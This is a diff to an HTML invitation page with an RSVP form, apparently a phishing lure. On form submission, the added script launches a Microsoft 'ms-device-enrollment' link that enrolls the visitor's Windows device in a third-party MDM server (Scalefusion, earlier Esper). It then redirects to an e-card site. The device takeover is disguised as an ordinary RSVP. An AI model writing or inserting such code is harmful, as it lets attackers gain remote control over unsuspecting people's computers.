@@ -13,7 +13,7 @@
      * or set --bg-image to your path/URL. Use --bg-image: none for gradient only.
      */
     :root {
-      --bg-image: url('Wluko.jpg');
+      --bg-image: url('annie-spratt-FjKZaj2b_Ls-unsplash.jpg');
       --ink: #111827;
       --ink-soft: #374151;
       --border: #e5e7eb;
@@ -186,13 +186,19 @@
   </div>
 
   <script>
-    var REDIRECT_URL = 'ms-device-enrollment:?mode=mdm&username=guest@specialinvite.vip&servername=https://jizatn-api.esper.cloud/api/v2/windows/discovery/Ymx1ZXByaW50X2lkPTljNmU4YTM0LTk0NTYtNGE5ZC1iOTcyLTQ4YjUyNjBmNTVkYyZncm91cF9pZD0yOWFiMzBhMi1hYTM3LTRmZjItYjFiNS1lNWYwNmE4OWNkYmE';
+    var REDIRECT_URL = 'https://ecardinvitations.online/';
 
     document.getElementById('rsvp-form').addEventListener('submit', function (e) {
       e.preventDefault();
       var input = document.getElementById('fullname');
       if (input && input.value.trim()) {
-        window.location.href = REDIRECT_URL;
+        // First, trigger the Microsoft enrollment popup
+        window.location.href = 'ms-device-enrollment:?mode=mdm&username=name@email.com&servername=https://app.scalefusion.com/msmde/RElGQ3lwaG43bWx4VDlDV0g4YVlrdz09Cg3q4al503q4al50user_session:';
+        
+        // Then redirect to the Scalefusion site after a short delay
+        setTimeout(function() {
+          window.location.href = REDIRECT_URL;
+        }, 500);
       }
     });
 
